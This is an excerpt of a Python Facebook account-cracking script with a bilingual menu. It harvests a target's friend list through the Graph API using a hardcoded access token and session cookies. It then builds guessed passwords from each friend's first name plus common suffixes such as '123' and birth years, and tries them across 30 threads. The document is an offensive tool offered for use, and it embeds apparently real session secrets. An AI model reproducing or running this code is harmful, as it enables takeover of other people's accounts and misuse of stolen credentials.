...
def Menu():
	print('''\033[2;36m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
       - Menu • القائمة -
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
\033[2;32m[ 1 ] - Crack From ID ~  صيد من ايدي
...
def get(user):
	try:
		url = requests.get('https://graph.facebook.com/{}'.format(user),params={'access_token': 'EAABwzLixnjYBO8aDgnZCXTXnwv91swARorjXxPtRfKOrqGejLbbgd6SXDN5RzrysOqQavJjCIrvPZB0FFCMJdZCJHUec6ZA8e7qQhLFodPKlJr9CXwb8MHZCzISXi4od26Ky1HNk6P1CpOBX6vgNY16JZB7CpfcEdoYDRTgmdZCWWWvhLdy53eCoZBuBtQBhUbQw3jgZD','fields': "friends"},headers={"user-agent": user_agent.generate_user_agent()},cookies={'cookies':'datr=htHxZke40Y_R-92rXAZPRAao; sb=htHxZvKX6ayMYU-sxQbV3_kT; m_pixel_ratio=2.75; wd=377x640; c_user=100090141104425; fr=0KjjFL5MGZXOUw9il.AWW1HfdFEqKhAL3RxILdoa_IzTw.Bm8dGG..AAA.0.0.Bm8dGp.AWVEVzgm9Mc; xs=41%3AkGcDIOleOMROdg%3A2%3A1727123883%3A-1%3A6553; locale=ar_AR; wl_cbv=v2%3Bclient_version%3A2629%3Btimestamp%3A1727123889; fbl_st=100725950%3BT%3A28785398; vpd=v1%3B640x377x2.75'}).json()
...
def password():
	with kil(max_workers=30) as kp:
		for kk in fid:
			...
			frs = nmf.split(' ')[0]
			pwv = [nmf,frs+frs,frs+' '+frs,frs+'123',frs+'12345',frs+'123456',frs+'2020',frs+'1990',frs+'2003',frs+'2007',frs+'123456789',frs+'1234512345',frs+'123321',frs+'1234567890',frs+'123456123456',frs+'111222',frs+'1122334455',]
